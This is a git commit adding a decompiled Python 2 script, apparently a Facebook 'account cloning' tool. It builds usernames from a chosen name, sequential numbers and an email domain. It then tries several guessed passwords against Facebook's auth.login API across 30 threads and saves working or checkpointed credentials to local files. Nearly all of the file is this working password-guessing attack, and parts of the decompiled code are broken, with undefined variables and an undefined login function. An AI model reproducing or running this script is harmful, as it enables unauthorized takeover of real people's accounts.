c6d590f39aa1fe9ac8aa477334bf5b4eefc075a3
zahid-king <100073732+zahid-king@users.noreply.github.com>
2022-02-28 13:04:32 +0500

    Add files via upload

---
+++ random_dec.py
@@ -0,0 +1,291 @@
+# Source Generated with Decompyle++
+# File: f.pyc (Python 2.7)
+
+
+try:
+    import os
+    import sys
+    import time
+    import datetime
+    import random
+    import hashlib
+    import re
+    import threading
+    import json
+    import getpass
+    import urllib
+    import cookielib
+    import requests
+    import uuid
+    import string
+    from multiprocessing.pool import ThreadPool
+    from requests.exceptions import ConnectionError
+except ImportError:
+    os.system('pip2 install requests')
+
+
+try:
+    os.mkdir('/sdcard/ids')
+except OSError:
+    pass
+
+import os
+import sys
+import time
+import datetime
+import random
+import hashlib
+import re
+import threading
+import json
+import urllib
+import cookielib
+import getpass
+os.system('rm -rf .txt')
+for n in range(1, 1000):
+    sys.stdout = open('.txt', 'a')
+    print n
+    sys.stdout.flush()
+
+from requests.exceptions import ConnectionError
+bd = random.randint(2e+07, 3e+07)
+sim = random.randint(20000, 40000)
+
+try:
+    import os
+    import sys
+    import time
+    import datetime
+    import random
+    import hashlib
+    import re
+    import threading
+    import json
+    import urllib
+    import cookielib
+    import getpass
+    import mechanize
+    import requests
+    import bxin
+    from multiprocessing.pool import ThreadPool
+    from requests.exceptions import ConnectionError
+    from mechanize import Browser
+except ImportError:
+    os.system('pip2 install requests')
+    os.system('pip2 install mechanize')
+    os.system('pip install bs4')
+    time.sleep(1)
+    os.system('python2 .README.md')
+
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+os.system('clear')
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
+br.addheaders = [
+    ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def exb():
+    print '[!] Exit Successfully '
+    os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+    
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+    
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+
+
+def jalan(x):
+    for e in x + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(3 / 200)
+    
+
+
+def tik():
+    titik = [
+        '   ',
+        '. ',
+        '.. ',
+        '...',
+        '. ',
+        '.. ',
+        '...',
+        '']
+    for o in titik:
+        print '\r\x1b[1;97m \x1b[1;91m               Load\x1b[1;92ming\x1b[1;0m\x1b[1;97m' + o,
+        sys.stdout.flush()
+        time.sleep(0.5)
+    
+
+logo = ' \x1b[0;92m FFFF U   U  CCC K  K \x1b[0m\n \x1b[0;91m F    U   U C    K K \x1b[0m \x1b[0;33m>>\x1b[0m Author > \x1b[1;37;40mZahid King\x1b[0m\x1b[0m\n \x1b[0;92m FFF  U   U C    KK\x1b[0m   \x1b[0;33m>>\x1b[0m Github.com/\x1b[1;37;40mZahid King\x1b[0m\x1b[0m\n  \x1b[0;91mF    U   U C    K K\x1b[0m\n \x1b[0;92m F     UUU   CCC K  K\x1b[0m'
+logo1 = ' \x1b[0;92m FFFF U   U  CCC K  K \x1b[0m\n \x1b[0;91m F    U   U C    K K \x1b[0m \x1b[0;33m>>\x1b[0m Author > \x1b[1;37;40mZahid  King\x1b[0m\x1b[0m\n \x1b[0;92m FFF  U   U C    KK\x1b[0m   \x1b[0;33m>>\x1b[0m Github.com/\x1b[1;37;40mZahid King\x1b[0m\x1b[0m\n  \x1b[0;91mF    U   U C    K K\x1b[0m\n \x1b[0;92m F     UUU   CCC K  K\x1b[0m'
+back = 0
+berhasil = []
+cekpoint = []
+oks = []
+id = []
+cpb = []
+
+def menu():
+    os.system('clear')
+    print logo
+    print 41 * '\x1b[1;98m\xe2\x81\x83'
+    print 
+    jalan('\x1b\x1b\x1b\x1b\x1b\x1b[1;92mSTART\x1b[1;90m CLONING  ')
+    print 
+    print 41 * '\x1b[1;98m\xe2\x81\x83'
+    action()
+
+
+def action():
+    ss = raw_input('\n\n \x1b[1;98m \xe2\x96\xba ')
+    if ss == '':
+        print '[!] Warning'
+        action()
+    elif ss == '1':
+        tik()
+        os.system('clear')
+        print logo
+        print '-----------------------------------------------'
+        print '\nEnter Any Random Name Ex Ali,Sadaf,Akbar : '
+        
+        try:
+            c = raw_input('\x1b\n[1;93mName : ')
+            k = raw_input('\x1b\n[1;91mType Domain Example \x1b[1;91m@gmail , \x1b[1;94m@Yahoo , \x1b[1;95m@Hotmail Or Empty For UserName\x1b[1;0m\n\t Domain : ')
+            pass2 = raw_input('\x1b\n[1;92mPassword 1  : ')
+            pass3 = raw_input('\x1b\n[1;92mPassword 2  : ')
+            pass4 = raw_input('\x1b\n[1;91mPassword 3  : ')
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+        
+
+    if ss == '0':
+        exb()
+        login()
+    else:
+        print '[!] Fill In Correctly'
+        action()
+    print 41 * '\x1b[1;98m-'
+    xxx = str(len(id))
+    jalan('\x1b[1;91mTOTAL IDS NUMBER : ' + xxx)
+    time.sleep(0.5)
+    jalan('\x1b[1;92mSTOP THIS PROCESS PRESS Ctrl THEN z')
+    time.sleep(0.5)
+    print 41 * '\x1b[1;98m-'
+    
+    def main(arg):
+        user = c + arg + k
+        
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        
+        try:
+            pass1 = c + arg
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m  [FUCK_OK]  ' + user + '  |  ' + pass1
+                okb = open('save/Fktmpl.txt', 'a')
+                okb.write(k + user + pass1 + '\n')
+                okb.close()
+                oks.append(user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m  [FUCK_CP]\x1b[1;0m ' + user + '  |  ' + pass1
+                cps = open('save/Fkcp.txt', 'a')
+                cps.write(k + user + pass1 + '\n')
+                cps.close()
+                cpb.append(user + pass1)
+            else:
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\x1b[1;92m  [FUCK_OK] ' + user + '  |  ' + pass2
+                    okb = open('save/Fktmpl.txt', 'a')
+                    okb.write(k + user + pass2 + '\n')
+                    okb.close()
+                    oks.append(user + pass2)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;91m  [FUCK_CP]\x1b[1;0m ' + user + '  |  ' + pass2
+                    cps = open('save/Fkcp.txt', 'a')
+                    cps.write(k + user + pass2 + '\n')
+                    cps.close()
+                    cpb.append(user + pass2)
+                else:
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;92m  [FUCK_OK]  ' + user + '  |  ' + pass3
+                        okb = open('save/Fkcp.txt', 'a')
+                        okb.write(k + user + pass3 + '\n')
+                        okb.close()
+                        oks.append(user + pass3)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;91m  [FUCK_CP]\x1b[1;0m ' + user + '  |  ' + pass3
+                        cps = open('save/Fkcp.txt', 'a')
+                        cps.write(k + user + pass3 + '\n')
+                        cps.close()
+                        cpb.append(user + pass3)
+                    else:
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\x1b[1;92m  [FUCK_OK]  ' + user + '  |  ' + pass4
+                            okb = open('save/Fkcp.txt', 'a')
+                            okb.write(k + user + pass4 + '\n')
+                            okb.close()
+                            oks.append(user + pass4)
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;91m  [FUCK_CP]\x1b[1;0m ' + user + '  |  ' + pass4
+                            cps = open('save/Fkcp.txt', 'a')
+                            cps.write(k + user + pass4 + '\n')
+                            cps.close()
+                            cpb.append(user + pass4)
+        except:
+            pass
+        
+
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50 * '\x1b[1;91m-'
+    print 'Process Has Been Completed ...'
+    print 'Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb))
+    print 'Cloned Accounts Has Been Saved : save/cloned.txt'
+    raw_input('\n\x1b[1;92m[\x1b[1;92mgo back\x1b[1;0m]')
+    login()
+
+if __name__ == '__main__':
+    menu()
